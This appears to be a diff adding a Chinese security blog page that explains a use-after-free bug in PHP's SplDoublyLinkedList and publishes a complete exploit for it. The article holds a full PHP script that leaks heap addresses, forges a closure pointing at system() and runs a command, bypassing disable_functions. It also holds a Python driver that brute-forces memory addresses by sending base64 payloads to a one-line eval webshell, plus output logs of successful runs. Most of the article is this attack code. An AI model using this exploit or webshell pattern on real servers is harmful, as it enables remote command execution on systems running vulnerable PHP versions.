@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>PHP SplDoublyLinkedList UAF 利用 - Twings</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期二, 十月 13日 2020, 11:41 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    2.6k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      13 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>9.20+ 号在 bugs.php.net 上看到的一个 UAF BUG：<a href="https://bugs.php.net/bug.php?id=80111" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=80111</a> ，报告人已经写出了 bypass disabled functions 的利用脚本并且私发了给官方，不过官方似乎还没有修复，原因不明。</p>
+<p>试了一下，bug 能在 7.4.10、7.3.22、7.2.34 版本触发，虽然报告者没有公布利用脚本，不过我们可以自己写一个。</p>
+<a id="more"></a>
+<hr>
+<h3 id="触发-UAF"><a href="#触发-UAF" class="headerlink" title="触发 UAF"></a>触发 UAF</h3><p>BUG 发生在 PHP 内置类 SplDoublyLinkedList，一个双链表类，有一个指针 traverse_pointer 用于指向当前位置。</p>
+<p>在调用 unset 删除链表元素的时候，处理顺序上有点问题：</p>
+<pre><code class="c">if (element != NULL) {
+    /* connect the neightbors */
+    ...
+
+    /* take care of head/tail */
+    ...
+
+    /* finally, delete the element */
+    llist-&gt;count--;
+
+    if(llist-&gt;dtor) {
+        llist-&gt;dtor(element);
+    }
+
+    if (intern-&gt;traverse_pointer == element) {
+        SPL_LLIST_DELREF(element);
+        intern-&gt;traverse_pointer = NULL;
+    }
+    ...
+}
+</code></pre>
+<p>可以看到，删除元素的操作被放在了置空 traverse_pointer 指针前。</p>
+<p>所以在删除一个对象时，我们可以在其构析函数中通过 current 访问到这个对象，也可以通过 next 访问到下一个元素。如果此时下一个元素已经被删除，就会导致 UAF。</p>
+<p>具体的触发脚本可以参考报告人给出的测试代码。</p>
+<h3 id="编写利用"><a href="#编写利用" class="headerlink" title="编写利用"></a>编写利用</h3><p>先看一下链表元素的结构体：</p>
+<pre><code class="c">typedef struct _spl_ptr_llist_element {
+    struct _spl_ptr_llist_element *prev;
+    struct _spl_ptr_llist_element *next;
+    int                            rc;
+    zval                           data;
+} spl_ptr_llist_element;
+</code></pre>
+<p>前后指针 + 引用计数 + zval 格式的 data，加起来就是 0x28。 </p>
+<p>而最方便控制的 zend_string 结构则是这样的：</p>
+<pre><code class="c">struct _zend_string {
+    zend_refcounted_h gc;
+    zend_ulong        h;                /* hash value */
+    size_t            len;
+    char              val[1];
+};
+</code></pre>
+<p>也就是说用一个字符串进行 UAF，我们基本可以控制元素的整个 data 部分。</p>
+<p>然后问题就来了，data 部分是个 zval，一般是个地址 + 类型的两地址单元数据，我们可以通过这里泄露某个地址的数据，但是我们没有泄露这个地址的途径。</p>
+<p>一开始我想通过 next 导致的链表元素引用计数 + 1（对应到字符串中就是字符串长度 + 1）来一个个字节地泄露出被删除元素 data 段存在的地址，结果发现 PHP 在为字符串分配地址的时候基本都会在最后加上个不算在字符串长度中的 \x00，所以这个思路也走不通了。</p>
+<p>所以最后是按照两种情况来处理，首先是没有限制 openbase_dir 的情况，可以读取 /proc/self/maps 来获取地址，具体思路如下：</p>
+<ul>
+<li>在链表中放置 3 个主要元素，分别是触发构析函数的对象、用来 UAF 的元素、closure 对象</li>
+<li>读取 /proc/self/maps，从中找到 PHP 申请的 Chunk（Chunk 最小为 2MB）</li>
+<li>在链表中放入一堆奇奇怪怪数据的元素，然后从 Chunk 中每 0x1000 字节搜索一次这些奇怪的元素</li>
+<li>通过该元素的前指针往前找到链表中的 closure 对象</li>
+<li>泄露出 closure handler 的地址，然后往前搜索 system 函数 handler 的地址</li>
+<li>伪造一个 closure 对象，将其 handler 设置为 system</li>
+<li>调用该 closure 对象，调用 system</li>
+</ul>
+<p>比较要注意的一点就是引用计数，具体原因可以自行调试。</p>
+<p>执行 php -v 的结果如下（Docker 镜像为 php:7.4.10-apache，上面只放了一句话 webshell）：</p>
+<pre><code>[+]Execute Payload, Output is:
+[+]PHP Chunk: 7f026be00000 - 7f026c000000, length: 0x200000
+[+]SplDoublyLinkedList Element: 7f026be540f0
+[+]Closure Chunk: 7f026be544b0
+[+]Closure Object: 7f026be588c0
+[+]Closure Handler: 7f026d4f9780
+[+]Find system&#39;s handler: 7f026cae9100
+[+]Executing command:
+PHP 7.4.10 (cli) (built: Sep 10 2020 13:50:32) ( NTS )
+Copyright (c) The PHP Group
+Zend Engine v3.4.0, Copyright (c) Zend Technologies
+[+]Done
+[+]Execute Payload Over.
+</code></pre><p>如果限制了 openbase_dir，就比较麻烦了，因为无法直接读取到 PHP Chunk 的地址，就只能通过爆破来获取，但是每次爆破都会导致 Apache 子进程崩溃重启一次（PHP 的 Web 服务一般是父子进程的形式，所以单纯子进程重启不会影响 PHP Chunk 的地址，除非将整个 Apache/FPM 重启），所以虽然说要爆破，但是也不能从 0x7f0000000000 开始每 0x20000 爆破一次，这样需要的爆破次数太多了。</p>
+<p>我想到的办法就是申请一个很大的 Chunk，比如 PHP 一般配置下最大内存使用为 128MB，我就申请一个 120MB 的 Chunk，而这个 Chunk 一般会排布在 Apache so 扩展、PHP Chunk 等数据的上方，所以我从 0x7f0000000000 开始每 0x8000000 爆破一次，如果没有崩溃就说明找到了这个大 Chunk，最坏的情况下需要爆破 8000+ 次。</p>
+<p>之后只要再每 0x20000 进行循环泄露出 PHP Chunk 和链表地址（偶尔会因为读取越界导致崩溃，一般不超过 100 次），后面就跟没有限制 openbase_dir 的情况一致了，一个比较快的执行结果如下：</p>
+<pre><code>[+]Execute Payload, Output is:
+[+]Bomb 100 times, address of first chunk maybe: 0x7f0320000000L
+[+]Bomb 200 times, address of first chunk maybe: 0x7f0640000000L
+[+]Bomb 300 times, address of first chunk maybe: 0x7f0960000000L
+[+]Bomb 400 times, address of first chunk maybe: 0x7f0c80000000L
+[+]Bomb 500 times, address of first chunk maybe: 0x7f0fa0000000L
+[+]Bomb 600 times, address of first chunk maybe: 0x7f12c0000000L
+[+]Bomb 700 times, address of first chunk maybe: 0x7f15e0000000L
+[+]Bomb 800 times, address of first chunk maybe: 0x7f1900000000L
+[+]Bomb 900 times, address of first chunk maybe: 0x7f1c20000000L
+[+]Bomb 1000 times, address of first chunk maybe: 0x7f1f40000000L
+[+]Bomb 1100 times, address of first chunk maybe: 0x7f2260000000L
+[+]Bomb 1200 times, address of first chunk maybe: 0x7f2580000000L
+[+]Bomb 1300 times, address of first chunk maybe: 0x7f28a0000000L
+[+]Bomb 1400 times, address of first chunk maybe: 0x7f2bc0000000L
+---------------------------------------------------------------------------------
+[+]Bomb 10 times, address of php chunk maybe: 0x7f2e51400000L
+[+]Bomb 20 times, address of php chunk maybe: 0x7f2e52800000L
+[+]Bomb 30 times, address of php chunk maybe: 0x7f2e53c00000L
+[+]Bomb 40 times, address of php chunk maybe: 0x7f2e55000000L
+[+]Bomb 50 times, address of php chunk maybe: 0x7f2e56400000L
+[+]Bomb 60 times, address of php chunk maybe: 0x7f2e57800000L
+[+]Bomb 70 times, address of php chunk maybe: 0x7f2e58c00000L
+[+]PHP crash 14 times
+---------------------------------------------------------------------------------
+[+]SplDoublyLinkedList Element: 7f2e596540f0
+[+]Closure Chunk: 7f2e596544b0
+[+]Closure Object: 7f2e59658b40
+[+]Find system&#39;s handler: 7f2e5a310100
+[+]Executing command:
+PHP 7.4.10 (cli) (built: Sep 10 2020 13:50:32) ( NTS )
+Copyright (c) The PHP Group
+Zend Engine v3.4.0, Copyright (c) Zend Technologies
+[+]Done
+[+]Execute Payload Over.
+</code></pre><p>崩溃了 1400+ 次。</p>
+<h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3><p>PHP 部分（仅在 7.4.10、7.3.22、7.2.34 版本测试），写的比较烂，师傅们凑合着看一下：</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+$a = str_repeat(&quot;T&quot;, 120 * 1024 * 1024);
+function i2s(&amp;$a, $p, $i, $x = 8) {
+    for($j = 0;$j &lt; $x;$j++) {
+        $a[$p + $j] = chr($i &amp; 0xff);
+        $i &gt;&gt;= 8;
+    }
+}
+
+function s2i($s) {
+    $result = 0;
+    for ($x = 0;$x &lt; strlen($s);$x++) {
+        $result &lt;&lt;= 8;
+        $result |= ord($s[$x]);
+    }
+    return $result;
+}
+
+function leak(&amp;$a, $address) {
+    global $s;
+    i2s($a, 0x00, $address - 0x10);
+    return strlen($s -&gt; current());
+}
+
+function getPHPChunk($maps) {
+    $pattern = &#39;/([0-9a-f]+\-[0-9a-f]+) rw\-p 00000000 00:00 0 /&#39;;
+    preg_match_all($pattern, $maps, $match);
+    foreach ($match[1] as $value) {
+        list($start, $end) = explode(&quot;-&quot;, $value);
+        if (($length = s2i(hex2bin($end)) - s2i(hex2bin($start))) &gt;= 0x200000 &amp;&amp; $length &lt;= 0x300000) {
+            $address = array(s2i(hex2bin($start)), s2i(hex2bin($end)), $length);
+            echo &quot;[+]PHP Chunk: &quot; . $start . &quot; - &quot; . $end . &quot;, length: 0x&quot; . dechex($length) . &quot;\n&quot;;
+            return $address;
+        }
+    }
+}
+
+function bomb1(&amp;$a) {
+    if (leak($a, s2i($_GET[&quot;test1&quot;])) === 0x5454545454545454) {
+        return (s2i($_GET[&quot;test1&quot;]) &amp; 0x7ffff0000000);
+    }else {
+        die(&quot;[!]Where is here&quot;);
+    }
+}
+
+function bomb2(&amp;$a) {
+    $start = s2i($_GET[&quot;test2&quot;]);
+    return getElement($a, array($start, $start + 0x200000, 0x200000));
+    die(&quot;[!]Not Found&quot;);
+}
+
+function getElement(&amp;$a, $address) {
+    for ($x = 0;$x &lt; ($address[2] / 0x1000 - 2);$x++) {
+        $addr = 0x108 + $address[0] + 0x1000 * $x + 0x1000;
+        for ($y = 0;$y &lt; 5;$y++) {
+            if (leak($a, $addr + $y * 0x08) === 0x1234567812345678 &amp;&amp; ((leak($a, $addr + $y * 0x08 - 0x08) &amp; 0xffffffff) === 0x01)){
+                echo &quot;[+]SplDoublyLinkedList Element: &quot; . dechex($addr + $y * 0x08 - 0x18) . &quot;\n&quot;;
+                return $addr + $y * 0x08 - 0x18;
+            }
+        }
+    }
+}
+
+function getClosureChunk(&amp;$a, $address) {
+    do {
+        $address = leak($a, $address);
+    }while(leak($a, $address) !== 0x00);
+    echo &quot;[+]Closure Chunk: &quot; . dechex($address) . &quot;\n&quot;;
+    return $address;
+}
+
+function getSystem(&amp;$a, $address) {
+    $start = $address &amp; 0xffffffffffff0000;
+    $lowestAddr = ($address &amp; 0x0000fffffff00000) - 0x0000000001000000;
+    for($i = 0; $i &lt; 0x1000 * 0x80; $i++) {
+        $addr = $start - $i * 0x20;
+        if ($addr &lt; $lowestAddr) {
+            break;
+        }
+        $nameAddr = leak($a, $addr);
+        if ($nameAddr &gt; $address || $nameAddr &lt; $lowestAddr) {
+            continue;
+        }
+        $name = dechex(leak($a, $nameAddr));
+        $name = str_pad($name, 16, &quot;0&quot;, STR_PAD_LEFT);
+        $name = strrev(hex2bin($name));
+        $name = explode(&quot;\x00&quot;, $name)[0];
+        if($name === &quot;system&quot;) {
+            return leak($a, $addr + 0x08);
+        }
+    }
+}
+
+class Trigger {
+    function __destruct() {
+        global $s;
+        unset($s[0]);
+        $a = str_shuffle(str_repeat(&quot;T&quot;, 0xf));
+        i2s($a, 0x00, 0x1234567812345678);
+        i2s($a, 0x08, 0x04, 7);
+        $s -&gt; current();
+        $s -&gt; next();
+        if ($s -&gt; current() !== 0x1234567812345678) {
+             die(&quot;[!]UAF Failed&quot;);
+        }
+        $maps = file_get_contents(&quot;/proc/self/maps&quot;);
+        if (!$maps) {
+            cantRead($a);
+        }else {
+            canRead($maps, $a);
+        }
+        echo &quot;[+]Done&quot;;
+    }
+}
+
+function bypass($elementAddress, &amp;$a) {
+    global $s;
+    if (!$closureChunkAddress = getClosureChunk($a, $elementAddress)) {
+        die(&quot;[!]Get Closure Chunk Address Failed&quot;);
+    }
+    $closure_object = leak($a, $closureChunkAddress + 0x18);
+    echo &quot;[+]Closure Object: &quot; . dechex($closure_object) . &quot;\n&quot;;
+    $closure_handlers = leak($a, $closure_object + 0x18);
+    echo &quot;[+]Closure Handler: &quot; . dechex($closure_handlers) . &quot;\n&quot;;
+    if(!($system_address = getSystem($a, $closure_handlers))) {
+        die(&quot;[!]Couldn&#39;t determine system address&quot;);
+    }
+    echo &quot;[+]Find system&#39;s handler: &quot; . dechex($system_address) . &quot;\n&quot;;
+    i2s($a, 0x08, 0x506, 7);
+    for ($i = 0;$i &lt; (0x130 / 0x08);$i++) {
+        $data = leak($a, $closure_object + 0x08 * $i);
+        i2s($a, 0x00, $closure_object + 0x30);
+        i2s($s -&gt; current(), 0x08 * $i + 0x100, $data);
+    }
+    i2s($a, 0x00, $closure_object + 0x30);
+    i2s($s -&gt; current(), 0x20, $system_address);
+    i2s($a, 0x00, $closure_object);
+    i2s($a, 0x08, 0x108, 7);
+    echo &quot;[+]Executing command: \n&quot;;
+    ($s -&gt; current())(&quot;php -v&quot;);
+}
+
+function canRead($maps, &amp;$a) {
+    global $s;
+    if (!$chunkAddress = getPHPChunk($maps)) {
+        die(&quot;[!]Get PHP Chunk Address Failed&quot;);
+    }
+    i2s($a, 0x08, 0x06, 7);
+    if (!$elementAddress = getElement($a, $chunkAddress)) {
+        die(&quot;[!]Get SplDoublyLinkedList Element Address Failed&quot;);
+    }
+    bypass($elementAddress, $a);
+}
+
+function cantRead(&amp;$a) {
+    global $s;
+    i2s($a, 0x08, 0x06, 7);
+    if (!isset($_GET[&quot;test1&quot;]) &amp;&amp; !isset($_GET[&quot;test2&quot;])) {
+        die(&quot;[!]Please try to get address of PHP Chunk&quot;);
+    }
+    if (isset($_GET[&quot;test1&quot;])) {
+        die(dechex(bomb1($a)));
+    }
+    if (isset($_GET[&quot;test2&quot;])) {
+        $elementAddress = bomb2($a);
+    }
+    if (!$elementAddress) {
+        die(&quot;[!]Get SplDoublyLinkedList Element Address Failed&quot;);
+    }
+    bypass($elementAddress, $a);
+}
+
+$s = new SplDoublyLinkedList();
+$s -&gt; push(new Trigger());
+$s -&gt; push(&quot;Twings&quot;);
+$s -&gt; push(function($x){});
+for ($x = 0;$x &lt; 0x100;$x++) {
+    $s -&gt; push(0x1234567812345678);
+}
+$s -&gt; rewind();
+unset($s[0]);
+</code></pre>
+<p>Python 部分比较简单，写好爆破部分就成，我写的很烂，师傅们看个大概就好：</p>
+<pre><code class="python"># -*- coding:utf8 -*-
+import requests
+import base64
+import time
+import urllib
+from libnum import n2s
+
+
+def bomb1(_url):
+    content = None
+    count = 1
+    addr = 0x7f0000000000  # change here and bomb1() in php if failed
+    while True:
+        try:
+            addr = addr + 0x10000000 / 2
+            if count % 100 == 0:
+                print &quot;[+]Bomb &quot; + str(count) + &quot; times, address of first chunk maybe: &quot; + str(hex(addr))
+            content = requests.post(_url + &quot;?test1=&quot; + urllib.quote(n2s(addr)), data={
+                &quot;c&quot;: &quot;eval(base64_decode(&#39;&quot; + payload + &quot;&#39;));&quot;,
+            }).content
+            if &quot;[!]&quot; in content or &quot;502 Bad Gateway&quot; in content:
+                count += 1
+                continue
+            break
+        except:
+            count += 1
+            continue
+    return content
+
+
+def bomb2(_url, _addr1):
+    content = None
+    count = 1
+    crashcount = 0
+    while True:
+        try:
+            _addr1 = _addr1 + 0x200000
+            if count % 10 == 0:
+                print &quot;[+]Bomb &quot; + str(count) + &quot; times, address of php chunk maybe: &quot; + str(hex(_addr1))
+            content = requests.post(_url + &quot;?test2=&quot; + urllib.quote(n2s(_addr1)), data={
+                &quot;c&quot;: &quot;eval(base64_decode(&#39;&quot; + payload + &quot;&#39;));&quot;,
+            }).content
+            if &quot;[!]&quot; in content or &quot;502 Bad Gateway&quot; in content:
+                count += 1
+                continue
+            break
+        except:
+            count += 1
+            crashcount += 1
+            continue
+    print &quot;[+]PHP crash &quot; + str(crashcount) + &quot; times&quot;
+    return content
+
+
+payload = open(&quot;E:/Tools/php disable_functions bypass/all.php&quot;).read()
+payload = base64.b64encode(&quot;?&gt;&quot; + payload)
+url = &quot;http://7wings.monster:32770/eval.php&quot;
+print &quot;[+]Execute Payload, Output is:&quot;
+content = requests.post(url, data={
+    &quot;c&quot;: &quot;eval(base64_decode(&#39;&quot; + payload + &quot;&#39;));&quot;,
+}).content
+if &quot;[!]Please try to get address of PHP Chunk&quot; in content:
+    addr1 = bomb1(url)
+    if addr1 is None:
+        exit(1)
+    print &quot;---------------------------------------------------------------------------------&quot;
+    addr2 = bomb2(url, int(addr1, 16))
+    if addr2 is None:
+        exit(1)
+    print &quot;---------------------------------------------------------------------------------&quot;
+    print addr2
+else:
+    print content
+print &quot;[+]Execute Payload Over.&quot;
+</code></pre>
+<h3 id="不足之处"><a href="#不足之处" class="headerlink" title="不足之处"></a>不足之处</h3><p>就像上面所说的，限制了 openbase_dir 情况下的利用，需要进行爆破，而且还会导致进程崩溃。</p>
+<p>由于本人水平限制，利用过程中可能存在各种各样的问题，如果各位师傅有更好的利用方式，欢迎指正与讨论。</p>
+<hr>
+<p>Orz</p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2020/10/13/commons-beanutils反序列化漏洞/">
+                        <span>commons-beanutils反序列化漏洞</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="/js/lazyload.js"></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "PHP SplDoublyLinkedList UAF 利用&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
